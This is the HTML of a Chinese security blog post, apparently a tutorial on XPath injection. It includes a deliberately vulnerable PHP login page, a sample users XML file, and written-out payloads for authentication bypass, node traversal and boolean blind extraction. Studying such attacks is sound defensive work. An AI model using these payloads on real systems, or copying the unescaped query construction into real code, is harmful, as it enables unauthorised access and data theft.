@@ -1,0 +1,853 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="XPath 是一门在 XML 文档中查找信息的语言，类比来看， XML 为数据库，XPath 为 SQL语言，用于查询数据。有查询嘛，十有八九就有注入的方式。">
+  <meta name="author" content="Tr0y">
+  <meta name="keywords" content="Tr0y, tr0y, Hexo, Blog, 博客, 信息安全">
+  
+  <title>XPath 注入指北 - Tr0y&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/monokai-sublime.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"www.tr0y.wang","root":"/","version":"1.8.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"丨","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":"🌧"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":"8e9bf819abf5fa586aeb29b27a17930f","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/rss.xml" title="Tr0y's Blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Tr0y's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-books"></i>
+                lifeline
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-archive-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/gallery/">
+                <i class="iconfont icon-images"></i>
+                gallery
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/page.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="XPath 注入指北">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2019-05-11 14:43" pubdate>
+        星期六, 五月 11日 2019, 2:43 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.5k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      19
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">XPath 注入指北</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：星期二, 十一月 10日 2020, 3:13 下午
+                
+              </p>
+            
+            <div class="markdown-body">
+              <p>XPath 是一门在 XML 文档中查找信息的语言，类比来看， XML 为数据库，XPath 为 SQL语言，用于查询数据。有查询嘛，十有八九就有注入的方式。</p>
+<span id="more"></span>
+<h2 id="XPath-简介"><a href="#XPath-简介" class="headerlink" title="XPath 简介"></a>XPath 简介</h2><p><code>XPath</code>，经常写爬虫的人应该都不陌生。比如 Python 中，经常使用 lxml 来获取网页的元素，特别方便。</p>
+<p>对应的 Chrome 也有一个插件，叫 <code>XPath Helper</code>，能直接给出鼠标所在的 XPath 路径：<br><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/XPath%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/20190511032929631.gif!blog" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>还有一个利用 XPath 在线解析 xml 的，<a target="_blank" rel="noopener" href="http://videlibri.sourceforge.net/cgi-bin/xidelcgi">传送门🚪</a></p>
+<p>强烈推荐，这些辅助工具都很好用。</p>
+<h2 id="XPath-极速入门"><a href="#XPath-极速入门" class="headerlink" title="XPath 极速入门"></a>XPath 极速入门</h2><p>菜鸟教程：<a target="_blank" rel="noopener" href="https://www.runoob.com/xpath/xpath-tutorial.html">传送门🚪</a></p>
+<h3 id="助攻函数"><a href="#助攻函数" class="headerlink" title="助攻函数"></a>助攻函数</h3><blockquote>
+<p>字符串相关</p>
+</blockquote>
+<ul>
+<li>codepoints-to-string(a, b, c, …)：将数字 a、b、c 转为对应的字符， Python 的<code>chr</code>函数类似。</li>
+<li>string-to-codepoints(string)：与上面的相反</li>
+<li>compare(a, b, rule)：比大小，func 是比较大小的规则</li>
+<li>string-join((string, string, …), sep)：使用 sep 参数作为分隔符，来返回 string 参数拼接后的字符串。</li>
+<li>substring(string, start [,len])：返回从 start 位置开始的指定长度的子字符串。第一个字符的下标是 1。如果省略 len 参数，则返回从位置 start 到字符串末尾的子字符串。</li>
+<li>string-length([string])：返回指定字符串的长度。如果没有 string 参数，则返回当前节点的字符串值的长度。</li>
+</ul>
+<blockquote>
+<p>其他函数</p>
+</blockquote>
+<ul>
+<li>count(item[, item1, …])：返回节点的数量。</li>
+<li>position()：返回当前正在被处理的节点的 index 位置。</li>
+<li>last()：返回在被处理的节点列表中的项目数目。</li>
+<li>name([nodeset])：返回当前节点的名称或指定节点集中的第一个节点。</li>
+</ul>
+<h2 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h2><p>XPath 注入基本上被分为常规注入和布尔盲注。测试代码如下：</p>
+<p>users.xml：<br><figure class="highlight dust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dust"><span class="xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span></span><br><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">users</span>&gt;</span></span><br><span class="xml">        <span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span></span><br><span class="xml">            <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span></span><br><span class="xml">            <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span></span><br><span class="xml">            <span class="hljs-tag">&lt;<span class="hljs-name">password</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;md5&quot;</span>&gt;</span>0192023a7bbd73250516f069df18b500<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span></span><br><span class="xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span></span><br><span class="xml">        <span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span></span><br><span class="xml">            <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span></span><br><span class="xml">            <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>jack<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span></span><br><span class="xml">            <span class="hljs-tag">&lt;<span class="hljs-name">password</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;md5&quot;</span>&gt;</span>1d6c1e168e362bc0092f247399003a88<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span></span><br><span class="xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span></span><br><span class="xml">        <span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span></span><br><span class="xml">            <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span></span><br><span class="xml">            <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>tony<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span></span><br><span class="xml">            <span class="hljs-tag">&lt;<span class="hljs-name">password</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;md5&quot;</span>&gt;</span>cc20f43c8c24dbc0b2539489b113277a<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span></span><br><span class="xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span></span><br><span class="xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">users</span>&gt;</span></span><br><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">secret</span>&gt;</span></span><br><span class="xml">        <span class="hljs-tag">&lt;<span class="hljs-name">flag</span>&gt;</span>flag</span><span class="hljs-template-variable">&#123;My_f1rst_xp4th_iNjecti0n&#125;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">flag</span>&gt;</span></span><br><span class="xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">secret</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span></span><br></code></pre></div></td></tr></table></figure></p>
+<p>index.php：<br><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$xml</span> = simplexml_load_file(<span class="hljs-string">&#x27;users.xml&#x27;</span>);<br><span class="hljs-variable">$name</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;u&#x27;</span>];<br><span class="hljs-variable">$pwd</span> = md5(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>]);<br><span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;/root/users/user[username/text()=&#x27;&quot;</span>.<span class="hljs-variable">$name</span>.<span class="hljs-string">&quot;&#x27; and password/text()=&#x27;&quot;</span>.<span class="hljs-variable">$pwd</span>.<span class="hljs-string">&quot;&#x27;]&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$query</span>;<br><span class="hljs-variable">$result</span> = <span class="hljs-variable">$xml</span>-&gt;xpath(<span class="hljs-variable">$query</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;h2&gt;Welcome&lt;/h2&gt;&#x27;</span>;<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$result</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br /&gt;ID:&#x27;</span>.<span class="hljs-variable">$value</span>-&gt;id;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br /&gt;Username:&#x27;</span>.<span class="hljs-variable">$value</span>-&gt;username;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure></p>
+<h3 id="常规注入"><a href="#常规注入" class="headerlink" title="常规注入"></a>常规注入</h3><blockquote>
+<p>万能密码</p>
+</blockquote>
+<p>这段测试代码的查询语句如下：<br><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">/root/users/<span class="hljs-keyword">user</span>[username/text()=<span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">password</span>/text()=<span class="hljs-string">&#x27;&#x27;</span>]<br></code></pre></div></td></tr></table></figure><br>显而易见，注入点只有 username，因为 password 会进行 md5。首先很容易想到万能密码：</p>
+<p>payload：<br><figure class="highlight ini"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">u</span> = <span class="hljs-string">&quot;admin&#x27; or &#x27;1&quot;</span><br><span class="hljs-attr">p</span> = <span class="hljs-string">&quot;&quot;</span><br></code></pre></div></td></tr></table></figure><br>结果：<br><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">/root/users/<span class="hljs-keyword">user</span>[username/text()=<span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">password</span>/text()=<span class="hljs-string">&#x27;d41d8cd98f00b204e9800998ecf8427e&#x27;</span>]<br></code></pre></div></td></tr></table></figure><br><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/XPath注入指北/20190512035526916.png!blog" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>这个 payload 需要知道一个存在的用户名。如果不知道的话，再加个 <code>or</code> 就行了：<br>payload<br><figure class="highlight ini"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">u</span> = <span class="hljs-string">&quot;&#x27; or 1 or &#x27;1&quot;</span><br><span class="hljs-attr">p</span>= <span class="hljs-string">&quot;&quot;</span><br></code></pre></div></td></tr></table></figure><br>结果<br><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">/root/users/<span class="hljs-keyword">user</span>[username/text()=<span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">password</span>/text()=<span class="hljs-string">&#x27;d41d8cd98f00b204e9800998ecf8427e&#x27;</span>]<br></code></pre></div></td></tr></table></figure><br><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/XPath注入指北/20190512041950485.png!blog" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>这里顺便一提，XPath 没有注释一说，所以构造的 payload 要精巧地闭合原语句。</p>
+<blockquote>
+<p>节点遍历</p>
+</blockquote>
+<p>payload<br><figure class="highlight ini"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">u</span> = <span class="hljs-string">&quot;admin&#x27;] | //* | //*[&#x27;&quot;</span><br><span class="hljs-attr">p</span> = <span class="hljs-string">&quot;&quot;</span><br></code></pre></div></td></tr></table></figure><br>结果<br><figure class="highlight elixir"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs elixir">/root/users/user[username/text()=<span class="hljs-string">&#x27;&#x27;</span>] | <span class="hljs-regexp">//</span>* | <span class="hljs-regexp">//</span>*[<span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">and</span> password/text()=<span class="hljs-string">&#x27;d41d8cd98f00b204e9800998ecf8427e&#x27;</span>]<br></code></pre></div></td></tr></table></figure><br><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/XPath注入指北/20190512042558144.png!blog" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>需要注意的是，这里的 <code>|</code>（路径运算符）不能用 <code>or</code>（布尔运算符） 替代，它们是不一样的。</p>
+<p>显然，节点遍历也能起到万能密码的作用，且无需知道一个存在的用户名。</p>
+<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>上面的<code>节点遍历</code>实际上是有点问题的，很明显我们没有拿到所有的数据，原因是 php 只会输出 <code>id</code> 和 <code>username</code>。从上面的截图也可以看出来，如果某个节点的名字不是 id 或者 username，php 就会打印空数据。这个时候就只能利用布尔盲注来获取数据了。</p>
+<ol>
+<li>判断根节点数量：<br>payload：<figure class="highlight ini"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">u</span> = <span class="hljs-string">&quot;&#x27; or count(/)=1 or &#x27;1&quot;</span><br></code></pre></div></td></tr></table></figure>
+<code>count(/)=1</code> 一直到 <code>count(/)=n</code>，判断出根节点有几个。<br>当<figure class="highlight ini"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">u</span> = <span class="hljs-string">&quot;&#x27; or count(/)=1 or &#x27;1&quot;</span><br></code></pre></div></td></tr></table></figure>
+返回正常，说明只有 1 个根节点。</li>
+<li>获取根节点名<br>首先获取名字长度。<br>payload：<figure class="highlight ini"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">u</span> = <span class="hljs-string">&quot;&#x27; or string-length(name(/*[1]))=1 or &#x27;1&quot;</span><br></code></pre></div></td></tr></table></figure>
+<code>string-length(name(/*[1]))=1</code> 一直到 <code>string-length(name(/*[1]))=1</code>，判断出第一个根节点的名字长度。<br>当<figure class="highlight ini"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">u</span> = <span class="hljs-string">&quot;&#x27; or string-length(name(/*[1]))=4 or &#x27;1&quot;</span><br></code></pre></div></td></tr></table></figure>
+返回正常，说明第一个根节点的名字长度为 4。<br>接下来获取逐个字符获取名字<br>payload<figure class="highlight ini"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">u</span> = <span class="hljs-string">&quot;&#x27; or substring(name(/*[1]), 1, 1)=&#x27;a&#x27; or &#x27;1&quot;</span><br></code></pre></div></td></tr></table></figure>
+遍历完所有的 ascii 字符后，判断出第一个根节点的名字的第一个字符。<br>当<figure class="highlight ini"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">u</span> = <span class="hljs-string">&quot;&#x27; or substring(name(/*[1]), 1, 1)=&#x27;r&#x27; or &#x27;1&quot;</span><br></code></pre></div></td></tr></table></figure>
+返回正常，说明第一个根节点的名字的第一个字符为 <code>r</code>。按照这个方法，可以判断出根节点名称为<code>root</code>。<br>按照上述步骤，可知 root 下的子节点数为 2，第一个子节点的名称为 <code>users</code>，第二个为 <code>secret</code>…不断重复上述过程，即可拿到完整的 XML 文件。</li>
+</ol>
+<h2 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h2><p>XPath 中有很多函数、Axes 可以替代类似<code>/</code>路径的作用，例如<code>root()</code>返回根节点、<code>child</code>选取当前节点的所有子元素等等。</p>
+<p>Axes 在这找：<a target="_blank" rel="noopener" href="https://www.runoob.com/xpath/xpath-axes.html">传送门🚪</a></p>
+<p>函数可以在这里找找：<a target="_blank" rel="noopener" href="https://www.runoob.com/xpath/xpath-functions.html">传送门🚪</a></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>XPath 注入和 SQl 注入特别类似，比较简单。目前我只在 CTF 中遇到过一次，现实中倒是没有遇见过。</p>
+<p><br><p style="text-align: center;" ><font size="2px" color="gray">来呀快活呀</font>
+<img src="https://clean-1252075454.cos.ap-nanjing.myqcloud.com/20200528120800990.png" srcset="/img/loading.gif" lazyload style="zoom:30%" />
+</p></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/">经验总结</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Web/">Web</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E6%B3%A8%E5%85%A5/">注入</a>
+                    
+                      <a class="hover-with-bg" href="/tags/XPath/">XPath</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2019/05/13/OWASP-Top10-%E7%B3%BB%E5%88%97%E4%B9%8BOS%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">OWASP Top10 系列之 OS 命令注入</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2019/05/11/OWASP-Top10-%E7%B3%BB%E5%88%97%E4%B9%8BXPath%E6%B3%A8%E5%85%A5/">
+                        <span class="hidden-mobile">OWASP Top10 系列之 XPath 注入</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments" lazyload>
+                
+                  
+                
+                
+  <script type="text/javascript">
+    Fluid.utils.lazyComments('comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'Macr0phag3/Macr0phag3.github.io');
+      s.setAttribute('issue-term', 'title');
+      
+      s.setAttribute('label', 'comment');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    <!-- Tr0y -->
+    
+      <!-- APlayer 音乐播放器 -->
+      <div id="aplayer"></div>
+      <script defer src="https://cdn.staticfile.org/aplayer/1.10.1/APlayer.min.js" ></script>
+<link  rel="stylesheet" href="https://cdn.staticfile.org/aplayer/1.10.1/APlayer.min.css" />
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+
+<script type="text/javascript">
+  function snow(icon) {
+    //1、定义一片雪花模板
+    var flake = $("<div>").css({
+        "position": "absolute",
+        "color": "#fff"
+    }).html(icon);
+
+    //获取页面的宽度，利用这个数来算出，雪花开始时left的值
+    var documentWidth = $(document).width();
+
+    //获取页面的高度 相当于雪花下落结束时Y轴的位置
+    var documentHieght = $(document).height();
+
+    //定义生成一片雪花的毫秒数
+    var millisec = 1000;
+    //2、设置第一个定时器，周期性定时器，每隔一段时间（millisec）生成一片雪花；
+    setInterval(function() {
